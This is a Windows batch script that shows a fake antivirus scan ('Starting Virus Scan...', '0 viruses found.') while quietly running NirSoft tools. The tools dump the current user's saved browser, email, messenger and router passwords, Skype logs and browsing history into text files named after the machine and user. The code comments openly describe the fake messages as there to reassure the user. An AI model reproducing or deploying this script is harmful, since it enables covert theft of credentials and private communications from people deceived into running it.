:: This script will launch the various tools and save the output to individual .txt files.
::	If this script is re-run on the same host, in the context of the same user, on the same day, 
:: 		the text files will be overwritten.
:: -----------------------------------------------------------------------------------------------------------------------------------

:: Turn off echo printing of tools/commands being run in DOS popup 
@echo off

:: Return fake antivirus program string to reassure user
echo Starting Virus Scan...

:: Set variable for the dynimic portions of the file, and include the file extension
FOR %%A IN (%Date:/=%) DO SET Today=%%A
:: Trim right white space, a maximum of 1 time (the final 1 in brackets represents max iterations)
for /l %%a in (1,1,1) do if "!Today:~-1!"==" " set Today=!Today:~0,-1!
SET dynpathname=%TODAY%_%COMPUTERNAME%_%USERNAME%.txt

:: -----------------------------------------------------------------------------------------------------------------------------------
:: Launch the various tools and save results to file. 
:: File name format is: ToolName_Date_ComputerName_Username.txt
:: No profile or path settings have been explicitly set below. Most, if not all tools here, will gather 
:: 		only the passwords belonging to the current user

:: WebBrowserPassView is a password recovery tool that reveals the passwords stored by the following Web browsers: 
:: 	Internet Explorer (Version 4.0 - 8.0), Mozilla Firefox (All Versions), Google Chrome, and Opera. 
:: 	This tool can be used to recover your lost/forgotten password of any Website, including popular Web sites, 
:: 	like Facebook, Yahoo, Google, and GMail, as long as the password is stored by your Web Browser. After retrieving 
:: 	your lost passwords, you can save them into text/html/csv/xml file, by using the 'Save Selected Items' option (Ctrl+S). 
start WebBrowserPassView.exe /stext WebBrowserPassView_%DYNPATHNAME%

:: SkypeLogView reads the log files created by Skype application, and displays the details of 
:: 	incoming/outgoing calls, chat messages, and file transfers made by the specified Skype account. 
:: 	You can select one or more items from the logs list, and then copy them to the clipboard, or export 
:: 	them into text/html/csv/xml file.
start SkypeLogView.exe /stext SkypeLogView_%DYNPATHNAME%

:: Windows utility that can recover lost passwords from configuration file saved by a router. 
:: 	This utility only works if your router save the configuration file in a format that RouterPassView can detect and decript.
start RouterPassView.exe /stext RouterPassView_%DYNPATHNAME%

:: Recovers all passwords stored inside the Windows Protected Storage, including the AutoComplete passwords 
:: 	of Internet Explorer, passwords of Password-protected sites, MSN Explorer Passwords, and more...
start pspv.exe /stext pspv_%DYNPATHNAME%

:: PasswordFox is a small password recovery tool for Windows that allows you to view the user names and passwords stored 
:: 	by Mozilla Firefox Web browser. By default, PasswordFox displays the passwords stored in your current profile, 
:: 	but you can easily select to watch the passwords of any other Firefox profile. For each password entry, 
:: 	the following information is displayed: Record Index, Web Site, User Name, Password, User Name Field, Password Field, 
:: 	and the Signons filename.
::		NOTE: doesn't seem to successfully retrieve passwords from XP, however, WebBrowserPassView does.
start PasswordFox.exe /stext PasswordFox_%DYNPATHNAME%

:: OperaPassView is a small password recovery tool that decrypts the content of the Opera Web browser 
:: 	password file (wand.dat) and displays the list of all Web site passwords stored in this file. 
:: 	You can easily select one or more passwords in the OperaPassView window, and then copy the passwords 
:: 	list to the clipboard and save it into text/html/csv/xml file.
start OperaPassView.exe /stext OperaPassView_%DYNPATHNAME%

:: Recovers the passwords of most popular Instant Messenger programs in Windows: 
:: 	MSN Messenger, Windows Messenger, Windows Live Messenger, Yahoo Messenger, 
:: 	ICQ Lite 4.x/2003, AOL Instant Messenger provided with Netscape 7, Trillian, Miranda, and GAIM.
start mspass.exe /stext mspass_%DYNPATHNAME%

:: Recovers the passwords of the following email programs: Windows Live Mail, 
:: 	Windows Mail, Outlook Express, Microsoft Outlook 2000 (POP3 and SMTP Accounts only), 
::	Microsoft Outlook 2002/2003 (POP3, IMAP, HTTP and SMTP Accounts), IncrediMail, Eudora, 
::	Netscape Mail, Mozilla Thunderbird, 
start mailpv.exe /stext mailpv_%DYNPATHNAME%

:: IE PassView is a small utility that reveals the passwords stored by Internet Explorer browser. 
::	It supports the new Internet Explorer 7.0 and 8.0, as well as older versions of Internet explorer, v4.0 - v6.0
start iepv.exe /stext iepv_%DYNPATHNAME%

:: ChromePass is a small password recovery tool for Windows that allows you to view the user names and passwords 
:: 	stored by Google Chrome Web browser. For each password entry, the following information is displayed: 
:: 	Origin URL, Action URL, User Name Field, Password Field, User Name, Password, and Created Time. 
:: 	You can select one or more items and then save them into text/html/xml file or copy them to the clipboard.
start ChromePass.exe /stext ChromePass_%DYNPATHNAME%

:: ChromeHistoryView is a small utility that reads the history data file of Google Chrome Web browser, and 
:: 	displays the list of all visited Web pages in the last days. For each visited Web page, the following 
:: 	information is displayed: URL, Title, Visit Date/Time, Number of visits, number of times that the user 
:: 	typed this address (Typed Count), Referrer, and Visit ID. You can select one or more history items, and 
:: 	them export them into html/xml/csv/text file, or copy the information to the clipboard and paste it into Excel.
start ChromeHistoryView.exe /stext ChromeHistoryView_%DYNPATHNAME%

:: BrowsingHistoryView is a utility that reads the history data of 4 different Web browsers 
:: 	(Internet Explorer, Mozilla Firefox, Google Chrome, and Safari) and displays the browsing 
:: 	history of all these Web browsers in one table. The browsing history table includes the 
:: 	following information: Visited URL, Title, Visit Time, Visit Count, Web browser and User Profile. 
:: 	BrowsingHistoryView allows you to watch the browsing history of all user profiles in a running system, 
:: 	as well as to get the browsing history from external hard drive. You can also export the browsing history 
:: 	into csv/tab-delimited/html/xml file from the user interface, or from command-line, without displaying 
:: 	any user interface.
start BrowsingHistoryView.exe /stext BrowsingHistoryView_%DYNPATHNAME%

:: End of tool commands
:: -----------------------------------------------------------------------------------------------------------------------------------


:: Return fake antivirus program string to reassure user
echo 0 viruses found.

:: Dirty Windows OS agnostic workaround to leave the fake antivirus echo strings open 
:: 	for 5 seconds before auto-exiting the DOS window popup
ping -n 5 127.0.0.1 > nul
exit